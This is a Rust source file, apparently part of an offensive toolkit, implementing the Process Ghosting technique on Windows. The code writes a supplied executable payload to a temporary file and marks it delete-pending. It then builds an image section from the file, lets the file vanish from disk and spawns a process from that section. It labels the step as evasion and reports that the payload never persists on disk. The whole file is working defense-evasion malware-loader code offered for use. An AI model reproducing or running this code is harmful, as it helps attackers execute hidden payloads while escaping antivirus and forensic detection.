//! Process Ghosting - execute PE from delete-pending file
//! Creates a file, marks it delete-pending, creates image section, then closes file (vanishes from disk).

use crate::error::MemoricError;
use ntapi::winapi::ctypes::c_void as nt_void;
use serde_json::Value;

/// Process Ghosting: run a PE payload that never exists on disk at execution time
pub fn process_ghost(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, WriteFile, CREATE_ALWAYS, FILE_FLAGS_AND_ATTRIBUTES, FILE_GENERIC_READ,
        FILE_GENERIC_WRITE, FILE_SHARE_NONE,
    };

    let payload_bytes_val = args
        .get("payload")
        .and_then(|v| v.as_array())
        .ok_or_else(|| {
            MemoricError::InjectionFailed("Missing payload (PE bytes array)".to_string())
        })?;
    let payload: Vec<u8> = payload_bytes_val
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    let temp_path = args
        .get("temp_path")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\Temp\\ghost.tmp");

    if payload.is_empty() {
        return Err(MemoricError::InjectionFailed(
            "Payload is empty".to_string(),
        ));
    }

    tracing::warn!(
        "[EVASION] Process Ghosting: {} bytes payload via {}",
        payload.len(),
        temp_path
    );

    unsafe {
        // Step 1: Create temp file and write payload
        let path_w: Vec<u16> = temp_path.encode_utf16().chain(std::iter::once(0)).collect();
        let file = CreateFileW(
            windows::core::PCWSTR(path_w.as_ptr()),
            FILE_GENERIC_WRITE.0 | FILE_GENERIC_READ.0,
            FILE_SHARE_NONE,
            None,
            CREATE_ALWAYS,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileW failed: {}", e)))?;

        WriteFile(file, Some(&payload), None, None).map_err(|e| {
            let _ = CloseHandle(file);
            MemoricError::WindowsApi(format!("WriteFile failed: {}", e))
        })?;

        // Step 2: Mark file as delete-pending via NtSetInformationFile
        let mut io_status: ntapi::ntioapi::IO_STATUS_BLOCK = std::mem::zeroed();
        let mut disp_info = ntapi::ntioapi::FILE_DISPOSITION_INFORMATION { DeleteFileA: 1 };

        let status = ntapi::ntioapi::NtSetInformationFile(
            file.0 as *mut nt_void,
            &mut io_status,
            &mut disp_info as *mut _ as *mut nt_void,
            std::mem::size_of::<ntapi::ntioapi::FILE_DISPOSITION_INFORMATION>() as u32,
            ntapi::ntioapi::FileDispositionInformation,
        );

        if status != 0 {
            let _ = CloseHandle(file);
            return Err(MemoricError::WindowsApi(format!(
                "NtSetInformationFile (delete-pending) failed: 0x{:08X}",
                status
            )));
        }

        // Step 3: Create image section from delete-pending file
        let mut section_handle: *mut nt_void = std::ptr::null_mut();
        let status = ntapi::ntmmapi::NtCreateSection(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            file.0 as *mut nt_void,
        );

        // Close file handle — file vanishes from disk
        let _ = CloseHandle(file);

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateSection failed: 0x{:08X}",
                status
            )));
        }

        // Step 4: Create process from section
        let mut process_handle: *mut nt_void = std::ptr::null_mut();
        let status = ntapi::ntpsapi::NtCreateProcessEx(
            &mut process_handle,
            0x1FFFFF, // PROCESS_ALL_ACCESS
            std::ptr::null_mut(),
            (-1isize) as *mut nt_void, // NtCurrentProcess
            0,
            section_handle,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
        );

        let _ = CloseHandle(HANDLE(section_handle as *mut _));

        if status != 0 {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateProcessEx failed: 0x{:08X}",
                status
            )));
        }

        let mut pbi: ntapi::ntpsapi::PROCESS_BASIC_INFORMATION = std::mem::zeroed();
        let mut ret_len = 0u32;
        ntapi::ntpsapi::NtQueryInformationProcess(
            process_handle,
            ntapi::ntpsapi::ProcessBasicInformation,
            &mut pbi as *mut _ as *mut nt_void,
            std::mem::size_of::<ntapi::ntpsapi::PROCESS_BASIC_INFORMATION>() as u32,
            &mut ret_len,
        );

        let ghost_pid = pbi.UniqueProcessId as u64;
        let _ = CloseHandle(HANDLE(process_handle as *mut _));

        Ok(serde_json::json!({
            "success": true,
            "technique": "process_ghosting",
            "ghost_pid": ghost_pid,
            "payload_size": payload.len(),
            "temp_path": temp_path,
            "message": "Process created from delete-pending file — payload never persisted on disk"
        }))
    }
}
